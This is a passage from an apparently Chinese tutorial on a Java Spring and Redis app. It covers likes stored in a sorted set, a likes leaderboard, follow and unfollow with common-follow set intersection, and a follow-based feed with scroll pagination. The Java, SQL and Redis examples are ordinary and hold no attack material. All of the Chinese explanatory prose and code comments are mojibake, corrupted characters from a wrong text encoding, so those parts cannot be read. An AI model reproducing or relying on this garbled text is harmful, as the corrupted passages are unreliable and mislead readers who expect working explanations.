3.1.æ•°æ®åº“ç‚¹èµæ•° + 1\n    boolean isSuccess = update().setSql(\"liked = liked + 1\").eq(\"id\", id).update();\n    // 3.2.ä¿å­˜ç”¨æˆ·åˆ°Redisçš„seté›†åˆ  zadd key value score\n    if (isSuccess) {\n      stringRedisTemplate.opsForZSet().add(key, userId.toString(), System.currentTimeMillis());\n    }\n  } else {\n    // 4.å¦‚æœå·²ç‚¹èµï¼Œå–æ¶ˆç‚¹èµ\n    // 4.1.æ•°æ®åº“ç‚¹èµæ•° -1\n    boolean isSuccess = update().setSql(\"liked = liked - 1\").eq(\"id\", id).update();\n    // 4.2.æŠŠç”¨æˆ·ä»Redisçš„seté›†åˆç§»é™¤\n    if (isSuccess) {\n      stringRedisTemplate.opsForZSet().remove(key, userId.toString());\n    }\n  }\n  return Result.ok();\n}\n\n\nprivate void isBlogLiked(Blog blog) {\n  // 1.è·å–ç™»å½•ç”¨æˆ·\n  UserDTO user = UserHolder.getUser();\n  if (user == null) {\n    // ç”¨æˆ·æœªç™»å½•ï¼Œæ— éœ€æŸ¥è¯¢æ˜¯å¦ç‚¹èµ\n    return;\n  }\n  Long userId = user.getId();\n  // 2.åˆ¤æ–­å½“å‰ç™»å½•ç”¨æˆ·æ˜¯å¦å·²ç»ç‚¹èµ\n  String key = \"blog:liked:\" + blog.getId();\n  Double score = stringRedisTemplate.opsForZSet().score(key, userId.toString());\n  blog.setIsLike(score != null);\n}\n```\n\n- ç‚¹èµæ’è¡Œæ¦œæ˜¾ç¤º\n\n```java\n// BlogController\n@GetMapping(\"/likes/{id}\")\npublic Result queryBlogLikes(@PathVariable(\"id\") Long id) {\n    return blogService.queryBlogLikes(id);\n}\n```\n\n```java\n// BlogService\n@Override\npublic Result queryBlogLikes(Long id) {\n    String key = BLOG_LIKED_KEY + id;\n    // 1.æŸ¥è¯¢top5çš„ç‚¹èµç”¨æˆ· zrange key 0 4\n    Set<String> top5 = stringRedisTemplate.opsForZSet().range(key, 0, 4);\n    if (top5 == null || top5.isEmpty()) {\n        return Result.ok(Collections.emptyList());\n    }\n    // 2.è§£æå‡ºå…¶ä¸­çš„ç”¨æˆ·id\n    List<Long> ids = top5.stream().map(Long::valueOf).collect(Collectors.toList());\n    String idStr = StrUtil.join(\",\", ids);\n    // 3.æ ¹æ®ç”¨æˆ·idæŸ¥è¯¢ç”¨æˆ· WHERE id IN ( 5 , 1 ) ORDER BY FIELD(id, 5, 1)\n    List<UserDTO> userDTOS = userService.query()\n            .in(\"id\", ids).last(\"ORDER BY FIELD(id,\" + idStr + \")\").list()\n            .stream()\n            .map(user -> BeanUtil.copyProperties(user, UserDTO.class))\n            .collect(Collectors.toList());\n    // 4.è¿”å›\n    return Result.ok(userDTOS);\n}\n```\n\n# â‘¨å¥½å‹å…³æ³¨-Set\n\n## â¶å…³æ³¨å’Œå–å…³\n\n![](https://img.jwt1399.top/img/202211301608038.png)\n\nå®ç°æ€è·¯ï¼šåŸºäºè¯¥è¡¨æ•°æ®ç»“æ„ï¼Œå®ç°ä¸¤ä¸ªæ¥å£ï¼š\n\n* å…³æ³¨å’Œå–å…³æ¥å£\n* åˆ¤æ–­æ˜¯å¦å…³æ³¨çš„æ¥å£\n\nå…³æ³¨æ˜¯Userä¹‹é—´çš„å…³ç³»ï¼Œæ˜¯åšä¸»ä¸ç²‰ä¸çš„å…³ç³»ï¼Œæ•°æ®åº“ä¸­æœ‰ä¸€å¼ tb_followè¡¨æ¥æ ‡ç¤ºï¼š\n\n```sql\nCREATE TABLE `tb_follow` (\n  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT 'ä¸»é”®',\n  `user_id` bigint(20) unsigned NOT NULL COMMENT 'ç”¨æˆ·id',\n  `follow_user_id` bigint(20) unsigned NOT NULL COMMENT 'å…³æ³¨çš„ç”¨æˆ·id',\n  `create_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT 'åˆ›å»ºæ—¶é—´',\n  PRIMARY KEY (`id`) USING BTREE\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 ROW_FORMAT=COMPACT;\n\n```\n\n- FollowController\n\n```java\n@Resource\nprivate IFollowService followService;\n\n//å…³æ³¨&å–å…³\n@PutMapping(\"/{id}/{isFollow}\")\npublic Result follow(@PathVariable(\"id\") Long followUserId, @PathVariable(\"isFollow\") Boolean isFollow) {\n    return followService.follow(followUserId, isFollow);\n}\n//åˆ¤æ–­æ˜¯å¦å…³æ³¨\n@GetMapping(\"/or/not/{id}\")\npublic Result isFollow(@PathVariable(\"id\") Long followUserId) {\n      return followService.isFollow(followUserId);\n}\n```\n\n- FollowService\n\n```java\n//å…³æ³¨&å–å…³\n@Override\npublic Result follow(Long followUserId, Boolean isFollow) {\n  // 1.è·å–ç™»å½•ç”¨æˆ·\n  Long userId = UserHolder.getUser().getId();\n  String key = \"follows:\" + userId;\n  // 1.åˆ¤æ–­åˆ°åº•æ˜¯å…³æ³¨è¿˜æ˜¯å–å…³\n  if (isFollow) {\n    // 2.å…³æ³¨ï¼Œæ–°å¢æ•°æ®\n    Follow follow = new Follow();\n    follow.setUserId(userId);\n    follow.setFollowUserId(followUserId);\n    boolean isSuccess = save(follow);\n  } else {\n    // 3.å–å…³ï¼Œåˆ é™¤ delete from tb_follow where user_id = ? and follow_user_id = ?\n    remove(new QueryWrapper<Follow>()\n           .eq(\"user_id\", userId).eq(\"follow_user_id\", followUserId));\n  }\n  return Result.ok();\n}\n\n//åˆ¤æ–­æ˜¯å¦å…³æ³¨\n@Override\npublic Result isFollow(Long followUserId) {\n  // 1.è·å–ç™»å½•ç”¨æˆ·\n  Long userId = UserHolder.getUser().getId();\n  // 2.æŸ¥è¯¢æ˜¯å¦å…³æ³¨ select count(*) from tb_follow where user_id = ? and follow_user_id = ?\n  Integer count = query().eq(\"user_id\", userId).eq(\"follow_user_id\", followUserId).count();\n  // 3.åˆ¤æ–­\n  return Result.ok(count > 0);\n}\n```\n\n## â·å…±åŒå…³æ³¨\n\næƒ³è¦æŸ¥çœ‹å…±åŒå…³æ³¨çš„å¥½å‹ï¼Œéœ€è¦é¦–å…ˆè¿›å…¥åˆ°è¿™ä¸ªé¡µé¢ï¼Œè¿™ä¸ªé¡µé¢ä¼šå‘èµ·ä¸¤ä¸ªè¯·æ±‚\n\n- 1ã€å»æŸ¥è¯¢ç”¨æˆ·çš„è¯¦æƒ…\n\n- 2ã€å»æŸ¥è¯¢ç”¨æˆ·çš„ç¬”è®°\n\n![](https://img.jwt1399.top/img/202212011715597.png)\n\n```java\n// UserController æ ¹æ®idæŸ¥è¯¢ç”¨æˆ·\n@GetMapping(\"/{id}\")\npublic Result queryUserById(@PathVariable(\"id\") Long userId){\n\t// æŸ¥è¯¢è¯¦æƒ…\n\tUser user = userService.getById(userId);\n\tif (user == null) {\n\t\treturn Result.ok();\n\t}\n\tUserDTO userDTO = BeanUtil.copyProperties(user, UserDTO.class);\n\t// è¿”å›\n\treturn Result.ok(userDTO);\n}\n\n// BlogController  æ ¹æ®idæŸ¥è¯¢åšä¸»çš„æ¢åº—ç¬”è®°\n@GetMapping(\"/of/user\")\npublic Result queryBlogByUserId(\n\t\t@RequestParam(value = \"current\", defaultValue = \"1\") Integer current,\n\t\t@RequestParam(\"id\") Long id) {\n\t// æ ¹æ®ç”¨æˆ·æŸ¥è¯¢\n\tPage<Blog> page = blogService.query()\n\t\t\t.eq(\"user_id\", id).page(new Page<>(current, SystemConstants.MAX_PAGE_SIZE));\n\t// è·å–å½“å‰é¡µæ•°æ®\n\tList<Blog> records = page.getRecords();\n\treturn Result.ok(records);\n}\n```\n\næ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹çœ‹å…±åŒå…³æ³¨å¦‚ä½•å®ç°ï¼š\n\néœ€æ±‚ï¼šåˆ©ç”¨Redisä¸­æ°å½“çš„æ•°æ®ç»“æ„ï¼Œå®ç°å…±åŒå…³æ³¨åŠŸèƒ½ã€‚åœ¨åšä¸»ä¸ªäººé¡µé¢å±•ç¤ºå‡ºå½“å‰ç”¨æˆ·ä¸åšä¸»çš„å…±åŒå…³æ³¨ã€‚\n\nåœ¨seté›†åˆä¸­ï¼Œæœ‰äº¤é›†å¹¶é›†è¡¥é›†çš„apiï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä¸¤äººçš„å…³æ³¨çš„äººåˆ†åˆ«æ”¾å…¥åˆ°ä¸€ä¸ªseté›†åˆä¸­ï¼Œç„¶åå†é€šè¿‡apiå»æŸ¥çœ‹è¿™ä¸¤ä¸ªseté›†åˆä¸­çš„äº¤é›†æ•°æ®ã€‚\n\n![](https://img.jwt1399.top/img/202212011726677.png)\n\næˆ‘ä»¬å…ˆæ¥æ”¹é€ å½“å‰çš„å…³æ³¨åˆ—è¡¨\n\næ”¹é€ åŸå› æ˜¯å› ä¸ºæˆ‘ä»¬éœ€è¦åœ¨ç”¨æˆ·å…³æ³¨äº†æŸä½ç”¨æˆ·åï¼Œéœ€è¦å°†æ•°æ®æ”¾å…¥åˆ°seté›†åˆä¸­ï¼Œæ–¹ä¾¿åç»­è¿›è¡Œå…±åŒå…³æ³¨ï¼ŒåŒæ—¶å½“å–æ¶ˆå…³æ³¨æ—¶ï¼Œä¹Ÿéœ€è¦ä»seté›†åˆä¸­è¿›è¡Œåˆ é™¤\n\n- FollowServiceImpl\n\n```java\n@Override\npublic Result follow(Long followUserId, Boolean isFollow) {\n    // 1.è·å–ç™»å½•ç”¨æˆ·\n    Long userId = UserHolder.getUser().getId();\n    String key = \"follows:\" + userId;\n    // 1.åˆ¤æ–­åˆ°åº•æ˜¯å…³æ³¨è¿˜æ˜¯å–å…³\n    if (isFollow) {\n        // 2.å…³æ³¨ï¼Œæ–°å¢æ•°æ®\n        Follow follow = new Follow();\n        follow.setUserId(userId);\n        follow.setFollowUserId(followUserId);\n        boolean isSuccess = save(follow);\n        if (isSuccess) {\n            // æŠŠå…³æ³¨ç”¨æˆ·çš„idï¼Œæ”¾å…¥redisçš„seté›†åˆ sadd userId followerUserId\n            stringRedisTemplate.opsForSet().add(key, followUserId.toString());\n        }\n    } else {\n        // 3.å–å…³ï¼Œåˆ é™¤ delete from tb_follow where user_id = ? and follow_user_id = ?\n        boolean isSuccess = remove(new QueryWrapper<Follow>()\n                .eq(\"user_id\", userId).eq(\"follow_user_id\", followUserId));\n        if (isSuccess) {\n            // æŠŠå…³æ³¨ç”¨æˆ·çš„idä»Redisé›†åˆä¸­ç§»é™¤\n            stringRedisTemplate.opsForSet().remove(key, followUserId.toString());\n        }\n    }\n    return Result.ok();\n}\n```\n\n**å…±åŒå…³æ³¨æ¥å£ï¼š**\n\n```java\n@GetMapping(\"/common/{id}\")\npublic Result followCommons(@PathVariable(\"id\") Long id){\n  return followService.followcommon(id);\n}\n```\n\n```java\n@Override\npublic Result followCommons(Long id) {\n    // 1.è·å–å½“å‰ç”¨æˆ·\n    Long userId = UserHolder.getUser().getId();\n    String key = \"follows:\" + userId;\n    // 2.æ±‚äº¤é›†\n    String key2 = \"follows:\" + id;\n    Set<String> intersect = stringRedisTemplate.opsForSet().intersect(key, key2);\n    if (intersect == null || intersect.isEmpty()) {\n        // æ— äº¤é›†\n        return Result.ok(Collections.emptyList());\n    }\n    // 3.è§£æidé›†åˆ\n    List<Long> ids = intersect.stream().map(Long::valueOf).collect(Collectors.toList());\n    // 4.æŸ¥è¯¢ç”¨æˆ·\n    List<UserDTO> users = userService.listByIds(ids)\n            .stream()\n            .map(user -> BeanUtil.copyProperties(user, UserDTO.class))\n            .collect(Collectors.toList());\n    return Result.ok(users);\n}\n```\n\n## â¸å…³æ³¨æ¨é€\n\n### 1.Feedæµå®ç°æ–¹æ¡ˆ\n\nå½“æˆ‘ä»¬å…³æ³¨äº†ç”¨æˆ·åï¼Œè¿™ä¸ªç”¨æˆ·å‘äº†åŠ¨æ€ï¼Œé‚£ä¹ˆæˆ‘ä»¬åº”è¯¥æŠŠè¿™äº›æ•°æ®æ¨é€ç»™ç”¨æˆ·ï¼Œè¿™ä¸ªéœ€æ±‚å°±æ˜¯å…³æ³¨æ¨é€ï¼Œåˆå«åšFeedæµï¼Œç›´è¯‘ä¸ºæŠ•å–‚ã€‚ä¸ºç”¨æˆ·æŒç»­çš„æä¾›â€œæ²‰æµ¸å¼â€çš„ä½“éªŒï¼Œé€šè¿‡æ— é™ä¸‹æ‹‰åˆ·æ–°è·å–æ–°çš„ä¿¡æ¯ã€‚\n\nå¯¹äºä¼ ç»Ÿçš„æ¨¡å¼çš„å†…å®¹è§£é”ï¼šæˆ‘ä»¬æ˜¯éœ€è¦ç”¨æˆ·å»é€šè¿‡æœç´¢å¼•æ“æˆ–è€…æ˜¯å…¶ä»–çš„æ–¹å¼å»è§£é”æƒ³è¦çœ‹çš„å†…å®¹\n\n![](https://img.jwt1399.top/img/202212011752007.png)\n\nå¯¹äºæ–°å‹çš„Feedæµçš„çš„æ•ˆæœï¼šä¸éœ€è¦æˆ‘ä»¬ç”¨æˆ·å†å»æ¨é€ä¿¡æ¯ï¼Œè€Œæ˜¯ç³»ç»Ÿåˆ†æç”¨æˆ·åˆ°åº•æƒ³è¦ä»€ä¹ˆï¼Œç„¶åç›´æ¥æŠŠå†…å®¹æ¨é€ç»™ç”¨æˆ·ï¼Œä»è€Œä½¿ç”¨æˆ·èƒ½å¤Ÿæ›´åŠ çš„èŠ‚çº¦æ—¶é—´ï¼Œä¸ç”¨ä¸»åŠ¨å»å¯»æ‰¾ã€‚\n\n![](https://img.jwt1399.top/img/202212011752526.png)\n\nFeedæµçš„å®ç°æœ‰ä¸¤ç§æ¨¡å¼ï¼š\n\n- Timelineï¼šä¸åšå†…å®¹ç­›é€‰ï¼Œç®€å•çš„æŒ‰ç…§å†…å®¹å‘å¸ƒæ—¶é—´æ’åºï¼Œå¸¸ç”¨äºå¥½å‹æˆ–å…³æ³¨ã€‚ä¾‹å¦‚æœ‹å‹åœˆ\n\n  * ä¼˜ç‚¹ï¼šä¿¡æ¯å…¨é¢ï¼Œä¸ä¼šæœ‰ç¼ºå¤±ã€‚å¹¶ä¸”å®ç°ä¹Ÿç›¸å¯¹ç®€å•\n\n  * ç¼ºç‚¹ï¼šä¿¡æ¯å™ªéŸ³è¾ƒå¤šï¼Œç”¨æˆ·ä¸ä¸€å®šæ„Ÿå…´è¶£ï¼Œå†…å®¹è·å–æ•ˆç‡ä½\n\n\n- æ™ºèƒ½æ’åºï¼šåˆ©ç”¨æ™ºèƒ½ç®—æ³•å±è”½æ‰è¿è§„çš„ã€ç”¨æˆ·ä¸æ„Ÿå…´è¶£çš„å†…å®¹ã€‚æ¨é€ç”¨æˆ·æ„Ÿå…´è¶£ä¿¡æ¯æ¥å¸å¼•ç”¨æˆ·\n\n  * ä¼˜ç‚¹ï¼šæŠ•å–‚ç”¨æˆ·æ„Ÿå…´è¶£ä¿¡æ¯ï¼Œç”¨æˆ·ç²˜åº¦å¾ˆé«˜ï¼Œå®¹æ˜“æ²‰è¿·\n\n  * ç¼ºç‚¹ï¼šå¦‚æœç®—æ³•ä¸ç²¾å‡†ï¼Œå¯èƒ½èµ·åˆ°åä½œç”¨\n\n\næœ¬ä¾‹ä¸­çš„ä¸ªäººé¡µé¢ï¼Œæ˜¯åŸºäºå…³æ³¨çš„å¥½å‹æ¥åšFeedæµï¼Œå› æ­¤é‡‡ç”¨Timelineçš„æ¨¡å¼ã€‚è¯¥æ¨¡å¼çš„å®ç°æ–¹æ¡ˆæœ‰ä¸‰ç§ï¼š\n\n* æ‹‰æ¨¡å¼\n* æ¨æ¨¡å¼\n* æ¨æ‹‰ç»“åˆ\n\n**æ‹‰æ¨¡å¼**ï¼šä¹Ÿå«åšè¯»æ‰©æ•£\n\nè¯¥æ¨¡å¼çš„æ ¸å¿ƒå«ä¹‰å°±æ˜¯ï¼šå½“å¼ ä¸‰å’Œæå››å’Œç‹äº”å‘äº†æ¶ˆæ¯åï¼Œéƒ½ä¼šä¿å­˜åœ¨è‡ªå·±çš„é‚®ç®±ä¸­ï¼Œå‡è®¾èµµå…­è¦è¯»å–ä¿¡æ¯ï¼Œé‚£ä¹ˆä»–ä¼šä»è¯»å–ä»–è‡ªå·±çš„æ”¶ä»¶ç®±ï¼Œæ­¤æ—¶ç³»ç»Ÿä¼šä»ä»–å…³æ³¨çš„äººç¾¤ä¸­ï¼ŒæŠŠä»–å…³æ³¨äººçš„ä¿¡æ¯å…¨éƒ¨éƒ½è¿›è¡Œæ‹‰å–ï¼Œç„¶ååœ¨è¿›è¡Œæ’åº\n\n- ä¼˜ç‚¹ï¼šæ¯”è¾ƒèŠ‚çº¦ç©ºé—´ï¼Œå› ä¸ºèµµå…­åœ¨è¯»ä¿¡æ¯æ—¶ï¼Œå¹¶æ²¡æœ‰é‡å¤è¯»å–ï¼Œè€Œä¸”è¯»å–å®Œä¹‹åå¯ä»¥æŠŠä»–çš„æ”¶ä»¶ç®±è¿›è¡Œæ¸…æ¥šã€‚\n\n- ç¼ºç‚¹ï¼šæ¯”è¾ƒå»¶è¿Ÿï¼Œå½“ç”¨æˆ·è¯»å–æ•°æ®æ—¶æ‰å»å…³æ³¨çš„äººé‡Œè¾¹å»è¯»å–æ•°æ®ï¼Œå‡è®¾ç”¨æˆ·å…³æ³¨äº†å¤§é‡çš„ç”¨æˆ·ï¼Œé‚£ä¹ˆæ­¤æ—¶å°±ä¼šæ‹‰å–æµ·é‡çš„å†…å®¹ï¼Œå¯¹æœåŠ¡å™¨å‹åŠ›å·¨å¤§ã€‚\n\n![](https://img.jwt1399.top/img/202212011754963.png)\n\n**æ¨æ¨¡å¼**ï¼šä¹Ÿå«åšå†™æ‰©æ•£ã€‚\n\næ¨æ¨¡å¼æ˜¯æ²¡æœ‰å†™é‚®ç®±çš„ï¼Œå½“å¼ ä¸‰å†™äº†ä¸€ä¸ªå†…å®¹ï¼Œæ­¤æ—¶ä¼šä¸»åŠ¨çš„æŠŠå¼ ä¸‰å†™çš„å†…å®¹å‘é€åˆ°ä»–çš„ç²‰ä¸æ”¶ä»¶ç®±ä¸­å»ï¼Œå‡è®¾æ­¤æ—¶æå››å†æ¥è¯»å–ï¼Œå°±ä¸ç”¨å†å»ä¸´æ—¶æ‹‰å–äº†\n\n- ä¼˜ç‚¹ï¼šæ—¶æ•ˆå¿«ï¼Œä¸ç”¨ä¸´æ—¶æ‹‰å–\n\n- ç¼ºç‚¹ï¼šå†…å­˜å‹åŠ›å¤§ï¼Œå‡è®¾ä¸€ä¸ªå¤§Vå†™ä¿¡æ¯ï¼Œå¾ˆå¤šäººå…³æ³¨ä»–ï¼Œ å°±ä¼šå†™å¾ˆå¤šåˆ†æ•°æ®åˆ°ç²‰ä¸é‚£è¾¹å»\n\n![](https://img.jwt1399.top/img/202212011754945.png)\n\n**æ¨æ‹‰ç»“åˆæ¨¡å¼**ï¼šä¹Ÿå«åšè¯»å†™æ··åˆï¼Œå…¼å…·æ¨å’Œæ‹‰ä¸¤ç§æ¨¡å¼çš„ä¼˜ç‚¹ã€‚\n\næ¨æ‹‰æ¨¡å¼æ˜¯ä¸€ä¸ªæŠ˜ä¸­çš„æ–¹æ¡ˆï¼Œåœ¨å‘ä»¶äººè¿™ä¸€ç«¯ï¼Œå¦‚æœæ˜¯ä¸ªæ™®é€šçš„äººï¼Œé‚£ä¹ˆæˆ‘ä»¬é‡‡ç”¨æ¨æ¨¡å¼ï¼Œç›´æ¥æŠŠæ•°æ®å†™å…¥åˆ°ä»–çš„ç²‰ä¸ä¸­å»ï¼Œå› ä¸ºæ™®é€šçš„äººä»–çš„ç²‰ä¸å…³æ³¨é‡æ¯”è¾ƒå°ï¼Œæ‰€ä»¥è¿™æ ·åšæ²¡æœ‰å‹åŠ›ï¼Œå¦‚æœæ˜¯å¤§Vï¼Œé‚£ä¹ˆç›´æ¥å°†æ•°æ®å…ˆå†™å…¥åˆ°ä¸€ä»½åˆ°å‘ä»¶ç®±é‡Œè¾¹å»ï¼Œç„¶åå†ç›´æ¥å†™ä¸€ä»½åˆ°æ´»è·ƒç²‰ä¸æ”¶ä»¶ç®±é‡Œè¾¹å»ï¼Œç°åœ¨ç«™åœ¨æ”¶ä»¶äººè¿™ç«¯æ¥çœ‹ï¼Œå¦‚æœæ˜¯æ´»è·ƒç²‰ä¸ï¼Œé‚£ä¹ˆå¤§Vå’Œæ™®é€šçš„äººå‘çš„éƒ½ä¼šç›´æ¥å†™å…¥åˆ°è‡ªå·±æ”¶ä»¶ç®±é‡Œè¾¹æ¥ï¼Œè€Œå¦‚æœæ˜¯æ™®é€šçš„ç²‰ä¸ï¼Œç”±äºä»–ä»¬ä¸Šçº¿ä¸æ˜¯å¾ˆé¢‘ç¹ï¼Œæ‰€ä»¥ç­‰ä»–ä»¬ä¸Šçº¿æ—¶ï¼Œå†ä»å‘ä»¶ç®±é‡Œè¾¹å»æ‹‰ä¿¡æ¯ã€‚\n\n![](https://img.jwt1399.top/img/202212011757395.png)\n\n### 2.æ¨é€åˆ°ç²‰ä¸æ”¶ä»¶ç®±\n\néœ€æ±‚ï¼šæˆ‘ä»¬åœ¨ä¿å­˜å®Œæ¢åº—ç¬”è®°åï¼Œç„¶åæŠŠæ•°æ®æ¨é€åˆ°ç²‰ä¸çš„redisä¸­å»ã€‚\n\n* ä¿®æ”¹æ–°å¢æ¢åº—ç¬”è®°çš„ä¸šåŠ¡ï¼Œåœ¨ä¿å­˜blogåˆ°æ•°æ®åº“çš„åŒæ—¶ï¼Œæ¨é€åˆ°ç²‰ä¸çš„æ”¶ä»¶ç®±\n* æ”¶ä»¶ç®±æ»¡è¶³å¯ä»¥æ ¹æ®æ—¶é—´æˆ³æ’åºï¼Œå¿…é¡»ç”¨Redisçš„æ•°æ®ç»“æ„å®ç°\n* æŸ¥è¯¢æ”¶ä»¶ç®±æ•°æ®æ—¶ï¼Œå¯ä»¥å®ç°åˆ†é¡µæŸ¥è¯¢\n\n```java\n@PostMapping\npublic Result saveBlog(@RequestBody Blog blog) {\n\t\treturn blogService.saveBlog(blog);\n}\n```\n\n```java\n@Override\npublic Result saveBlog(Blog blog) {\n  // 1.è·å–ç™»å½•ç”¨æˆ·\n  UserDTO user = UserHolder.getUser();\n  blog.setUserId(user.getId());\n  // 2.ä¿å­˜æ¢åº—ç¬”è®°\n  boolean isSuccess = save(blog);\n  if(!isSuccess){\n    return Result.fail(\"æ–°å¢ç¬”è®°å¤±è´¥!\");\n  }\n  // 3.æŸ¥è¯¢ç¬”è®°ä½œè€…çš„æ‰€æœ‰ç²‰ä¸ select * from tb_follow where follow_user_id = ?\n  List<Follow> follows = followService.query().eq(\"follow_user_id\", user.getId()).list();\n  // 4.æ¨é€ç¬”è®°idç»™æ‰€æœ‰ç²‰ä¸\n  for (Follow follow : follows) {\n    // 4.1.è·å–ç²‰ä¸id\n    Long userId = follow.getUserId();\n    // 4.2.æ¨é€\n    String key = FEED_KEY + userId;\n    stringRedisTemplate.opsForZSet().add(key, blog.getId().toString(), System.currentTimeMillis());\n  }\n  // 5.è¿”å›id\n  return Result.ok(blog.getId());\n}\n```\n\n### 3.å®ç°åˆ†é¡µæŸ¥è¯¢æ”¶é‚®ç®±\n\n> éœ€æ±‚ï¼šåœ¨ä¸ªäººä¸»é¡µçš„â€œå…³æ³¨â€å¡ç‰‡ä¸­ï¼ŒæŸ¥è¯¢å¹¶å±•ç¤ºæ¨é€çš„Blogä¿¡æ¯\n\n**ä¼ ç»Ÿåˆ†é¡µ**åœ¨feedæµæ˜¯ä¸é€‚ç”¨çš„ï¼Œå› ä¸ºæˆ‘ä»¬çš„æ•°æ®ä¼šéšæ—¶å‘ç”Ÿå˜åŒ–\n\n- å‡è®¾åœ¨t1æ—¶åˆ»ï¼Œæˆ‘ä»¬å»è¯»å–ç¬¬ä¸€é¡µï¼Œæ­¤æ—¶page = 1 ï¼Œsize = 5 ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ‹¿åˆ°çš„å°±æ˜¯10~6 è¿™å‡ æ¡è®°å½•ï¼Œ\n\n- å‡è®¾åœ¨t2æ—¶åˆ»åˆå‘å¸ƒäº†ä¸€æ¡è®°å½•ï¼Œæ­¤æ—¶t3 æ—¶åˆ»ï¼Œæˆ‘ä»¬æ¥è¯»å–ç¬¬äºŒé¡µï¼Œè¯»å–ç¬¬äºŒé¡µä¼ å…¥çš„å‚æ•°æ˜¯page=2 ï¼Œsize=5 é‚£ä¹ˆæ­¤æ—¶è¯»å–åˆ°çš„ç¬¬äºŒé¡µå®é™…ä¸Šæ˜¯ä»6 å¼€å§‹ï¼Œç„¶åæ˜¯6~2 ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¯»å–åˆ°äº†é‡å¤çš„æ•°æ®ï¼Œæ‰€ä»¥feedæµçš„åˆ†é¡µï¼Œä¸èƒ½é‡‡ç”¨åŸå§‹æ–¹æ¡ˆæ¥åšã€‚\n\n![](https://img.jwt1399.top/img/202212021653849.png)\n\n**Redisæƒ…å†µæ¨¡æ‹Ÿï¼š**\n\n```sql\n# é€šè¿‡è§’æ ‡å€’åºæŸ¥è¯¢\nZREVRANGE key start stop [WITHSCORES]\n\n# é€šè¿‡è§’æ ‡æ­£åºæŸ¥è¯¢\nZRANGE key start stop [WITHSCORES]\n```\n\n\n\n```sql\n# åœ¨Zsetä¸­æ·»åŠ 6ä¸ªæ•°æ®\n127.0.0.1:6379>ZADD \"zkey\" 6 \"m6\" 5 \"m5\" 4 \"m4\" 3 \"m3\" 2 \"m2\" 1 \"m1\"\n\n# é™åºæŸ¥å‰3ä¸ªå…ƒç´ \n127.0.0.1:6379> ZREVRANGE zkey 0 2 WITHSCORES\n1) \"m6\"\n2) \"6\"\n3) \"m5\"\n4) \"5\"\n5) \"m4\"\n6) \"4\"\n# æ·»åŠ ä¸€ä¸ªå…ƒç´ \n127.0.0.1:6379> ZADD zkey 7 m7\n(integer) 1\n# é™åºæŸ¥å3ä¸ªå…ƒç´ ä¼´éšç€åˆ†æ•°ï¼ŒæŸ¥åˆ°äº†é‡å¤æ•°æ®\n127.0.0.1:6379> ZREVRANGE zkey 3 5 WITHSCORES\n1) \"m4\"\n2) \"4\"\n3) \"m3\"\n4) \"3\"\n5) \"m2\"\n6) \"2\"\n```\n\n**æ»šåŠ¨åˆ†é¡µ**ï¼šæˆ‘ä»¬éœ€è¦è®°å½•æ¯æ¬¡æ“ä½œçš„æœ€åä¸€æ¡ï¼Œç„¶åä»è¿™ä¸ªä½ç½®å¼€å§‹å»è¯»å–æ•°æ®\n\n- å‡è®¾åœ¨t1æ—¶åˆ»å¼€å§‹ï¼Œæ‹¿ç¬¬ä¸€é¡µæ•°æ®ï¼Œæ‹¿åˆ°äº†10~6ï¼Œç„¶åè®°å½•ä¸‹å½“å‰æœ€åä¸€æ¬¡æ‹¿å–çš„è®°å½•ï¼Œå°±æ˜¯6ï¼Œ\n- å‡è®¾åœ¨t2æ—¶åˆ»å‘å¸ƒäº†æ–°çš„è®°å½•ï¼Œæ­¤æ—¶è¿™ä¸ª11æ”¾åˆ°æœ€é¡¶ä¸Šï¼Œä½†æ˜¯ä¸ä¼šå½±å“æˆ‘ä»¬ä¹‹å‰è®°å½•çš„6ï¼Œæ­¤æ—¶t3æ—¶åˆ»æ¥æ‹¿ç¬¬äºŒé¡µï¼Œè¿™ä¸ªæ—¶å€™æ‹¿æ•°æ®å°±ä»6åä¸€ç‚¹çš„5å»æ‹¿ï¼Œå°±æ‹¿åˆ°äº†5-1çš„è®°å½•ã€‚\n- é‡‡ç”¨sortedSetæ¥åšï¼Œå¯ä»¥è¿›è¡ŒèŒƒå›´æŸ¥è¯¢ï¼Œå¹¶ä¸”è¿˜å¯ä»¥è®°å½•å½“å‰è·å–æ•°æ®æ—¶é—´æˆ³æœ€å°å€¼ï¼Œå°±å¯ä»¥å®ç°æ»šåŠ¨åˆ†é¡µäº†\n\n![](https://img.jwt1399.top/img/202212021653037.png)\n\n**Redisæƒ…å†µæ¨¡æ‹Ÿï¼š**\n\n```sql\n# é€šè¿‡åˆ†æ•°å€’åºæŸ¥è¯¢\nZREVRANGEBYSCORE key max min [WITHSCORES] [LIMIT offset count]\n\nmaxï¼šæœ€å¤§åˆ†æ•°å€¼\nminï¼šæœ€å°åˆ†æ•°å€¼\noffsetï¼šåç§»é‡ï¼Œè¿”å›ç»“æœçš„èµ·å§‹ä½ç½®\ncountï¼šæŸ¥è¯¢ä¸ªæ•°ï¼Œè¿”å›ç»“æœæ•°é‡\n```\n\n```sql\n127.0.0.1:6379> ZREVRANGEBYSCORE zkey 1000 0 WITHSCORES LIMIT 0 3\n1) \"m7\"\n2) \"7\"\n3) \"m6\"\n4) \"6\"\n5) \"m5\"\n6) \"5\"\n\n127.0.0.1:6379> ZADD zkey 8 m8\n(integer) 1\n\n# æ²¡æœ‰æŸ¥åˆ°é‡å¤æ•°æ®\n127.0.0.1:6379> ZREVRANGEBYSCORE zkey 5 0 WITHSCORES LIMIT 1 3\n1) \"m4\"\n2) \"4\"\n3) \"m3\"\n4) \"3\"\n5) \"m2\"\n6) \"2\"\n```\n\nå…·ä½“æ“ä½œå¦‚ä¸‹ï¼š\n\n- 1ã€æ¯æ¬¡æŸ¥è¯¢å®Œæˆåï¼Œæˆ‘ä»¬è¦å¾—åˆ°æŸ¥è¯¢å‡ºæ•°æ®çš„æœ€å°æ—¶é—´æˆ³ï¼Œè¿™ä¸ªå€¼ä¼šä½œä¸ºä¸‹ä¸€æ¬¡æŸ¥è¯¢çš„æ¡ä»¶\n\n- 